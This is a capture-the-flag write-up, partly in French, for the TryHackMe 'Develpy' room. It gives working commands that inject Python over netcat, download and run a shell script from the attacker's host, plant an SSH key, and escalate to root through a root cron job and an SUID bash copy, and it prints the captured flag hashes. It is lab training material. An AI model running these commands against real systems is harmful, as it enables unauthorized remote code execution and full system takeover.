# Tryhackme.com Room : Develpy

`https://tryhackme.com/room/bsidesgtdevelpy`



## Instance

```
export IP='10.10.61.29'
```



## Nmap

```

```

voir `vulnet_dotpy` pour voir comment avoir un handle sur `Popen`



We got python code execution by piping output to port `10000`

Super easy, to get shell cmd execution :

```
echo '__builtins__.__import__("os").system("wget http://10.6.32.20:8000/pwned")' | nc 10.10.196.166 10000
```

Tried to pass a revshell in the commands but had trouble so I just written a python revshell script, downloaded it from the box and executed :

```
echo '__builtins__.__import__("os").system("wget http://10.6.32.20:8000/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh")' | nc 10.10.196.166 10000
```



And we are logged in as `king`



`/home/king/user.txt` :

```
cf85ff769cfaaa721758949bf870b019
```



## Priv esc
There is 2 shell scripts in `/home/king`.
`/home/king/run.sh` :
```
#!/bin/bash
kill cat /home/king/.pid
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
echo $! > /home/king/.pid
```

And `/home/king/root.sh` :
```
python /root/company/media/*.py
```

Let's look at `/etc/crontab` :
```
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
```

So those scripts are runned every minutes. There is also `/root/company/run.sh` but we can't see what it is.
We can edit `/home/king/run.sh` but it doesn't help us since it is runned as the user `king`.

Before continuing, let's talk about the file `/home/king/credentials.png`.
I downloaded the file on my machine to see if there is something there.
Running `binwalk` reveal a `.zlib` file. So we decompress it and then we have a of type :
```
TTComp archive, binary, 4K dictionary
```

Didn't find a way to extract this, found some `go` lib and it didn't really work so I just went back to the machine.

Anyhoww, back on the box, I ran `pspy` to see what was executed by the cron jobs and we see :
```
python3 manage.py runserver 127.0.0.1:8080
```
Hmm interesting, I added my `ssh` public key to `/home/king/.ssh/authorized_keys` so that I could easily forward port `8080` to my machine.

We find a website where we can upload `.py` files.
We upload a test.py file :
```python
import os
os.system('wget http://10.6.32.20:8000/pwned')
```
The website says that it was uploaded to `/media/test.py` but we can't access it via the website.
After a minute or so we get a hit on our server.
We also see in `pspy` :
```
python /root/company/media/test.py
```

Which is runned via the wildcard extension in `/home/king/root.sh` runned via the `root` `cronjob`.
So here we have it. Let's create a `SUID` copy of bash with :
```python
import os
os.system('cp /bin/bash /tmp/bash && chmod +s /tmp/bash')
```

A caveat is that the wildcard expansion in `/home/king/root.sh` will result in :
```
python /root/company/media/1.py /root/company/media/2.py /root/company/media/3.py ...
```

Only the first script is executed, so we gotta name our script accordingly.

And we get `root` by execution `/tmp/bash -p`

`/root/root.txt` :
```
9c37646777a53910a347f387dce025ec
```

## Wrap up
* This was a cool little challenge. Not super hard
* After finishing, I read some writeups and found out that the `credentials.png` image can be interpreted by the `piet` language.
** Couldn't make it work with this online interprete `https://www.bertnase.de/npiet/npiet-execute.php` Would always receive an error.
** Same with standalone libraries.
** Anyways, this would have given us the `king` user `credentials` but it didn't matter at all. We didn't need them we were already `king`. By adding our `ssh` key to `authorized_keys` we were able to connect via `ssh` and do port redirection so no need for the credentials. + We weren't in sudoers so no need for the password at all.

